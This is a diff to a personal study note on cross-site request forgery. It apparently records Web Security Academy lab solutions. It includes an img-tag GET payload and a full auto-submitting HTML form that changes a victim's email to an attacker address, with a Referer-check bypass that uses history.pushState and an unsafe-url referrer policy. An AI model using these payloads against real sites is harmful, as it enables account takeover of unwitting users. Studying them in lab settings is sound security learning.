@@ -15,7 +15,7 @@ CSRF is an attack when attacker induces user to perform some actions on site tha
 This html page will force user to change email  
 Easiest way to construct CSRF page is to use CSRF PoC from engagement tools  
 If it's possible to perform CSRF via GET request, we can use smth like this:
-```
+``` 
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
 ## Bypassing CSRF token validation  
@@ -106,4 +106,22 @@ We can modify JS script in CSRF PoC ike this:
 ```
 history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
 ```
-
+MAYBE HEADER IS WRONG. POSSIBLE SOLUTION:  
+Add `<meta name="referrer" content="unsafe-url">`  
+Full possible exploit:
+```
+<html>
+    <head>
+        <meta name="referrer" content="unsafe-url">
+    </head>
+    <body>
+        <form action="https://0a0700be0447208882aec5ff00e40069.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="attacker3@evil.com">
+        </form>
+        <script>
+            history.pushState('', '', '/?0a0700be0447208882aec5ff00e40069.web-security-academy.net')
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
